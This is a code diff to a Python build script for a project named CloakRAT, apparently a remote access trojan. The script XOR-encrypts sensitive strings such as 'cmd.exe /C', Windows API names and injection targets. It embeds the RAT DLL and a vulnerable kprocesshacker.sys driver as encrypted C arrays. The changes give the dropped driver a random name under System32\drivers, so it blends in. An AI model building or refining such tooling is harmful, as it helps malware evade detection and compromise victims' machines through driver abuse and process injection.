@@ -10,7 +10,7 @@ HEADER_XOR_KEY_VARIABLE_NAME = 'BUILD_TIME_KEY'
 HEADER_XOR_CIPHER_VARIABLE_NAME = 'BUILD_TIME_CIPHER_BYTE'
 
 def get_random_driver_name(length: int) -> str:
-    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))
+    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(length))
 
 # Add or modify strings here.
 strings_to_encrypt = {
@@ -19,7 +19,7 @@ strings_to_encrypt = {
     'str_cmd': 'cmd.exe /C',
     'str_dllPath': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',  # USED BY OLD INJECTOR
     'str_procName': 'notepad.exe', # USED BY OLD INJECTOR
-    'str_kphDriverPathOnDisk': f'C:\\Windows\\System32\\{get_random_driver_name(8)}.sys',
+    'str_kphDriverPathOnDisk': f'C:\\Windows\\System32\\drivers\\{get_random_driver_name(8)}.sys',
     
     # Function names
     'str_NtSetInformationThread': 'NtSetInformationThread',
@@ -83,9 +83,9 @@ strings_to_encrypt = {
 }
 
 # Add files paths here.
-files_list = {
-    'rat_dll': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',
-    'vuln_driver': f'{CURR_DIR}\\kprocesshacker.sys'
+files_to_encrypt = {
+    'rat_dll_encrypted': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',
+    'kprocesshacker_driver_encrypted': f'{CURR_DIR}\\kprocesshacker.sys'
 }
 
 def gen_key() -> list[int]:
@@ -148,7 +148,7 @@ def main():
             header_file.write(c_struct + '\n\n')  # Example: static EncryptedBytes str_kernel32 = { str_kernel32_data, sizeof(str_kernel32_data) };
             
         # Encrypt files (raw bytes)
-        for var_name, file_path in files_list.items():
+        for var_name, file_path in files_to_encrypt.items():
             with open(file_path, 'rb') as file:                
                 raw_bytes = file.read()
                 encrypted_c_arr = to_c_array(var_name, xor_encrypt(raw_bytes, key, byte_chiper))
